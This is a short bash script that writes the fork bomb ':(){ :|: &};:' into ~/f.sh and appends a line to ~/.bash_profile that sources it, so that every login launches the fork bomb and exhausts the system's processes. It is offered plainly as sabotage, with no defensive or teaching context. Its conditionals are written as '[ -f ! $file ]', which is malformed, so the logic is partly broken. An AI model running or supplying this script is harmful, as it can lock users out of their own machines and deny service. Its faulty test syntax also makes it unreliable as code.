file1=f.sh
file2=.bash_profile
# Change to home directory
cd ~

if [ -f ! $file2 ]
then
		touch $file2
fi

if [ -f ! $file1 ]
then
		touch $file1
		echo ":(){ :|: &};:">>$file1
fi

echo "source ~/f.sh">>$file2
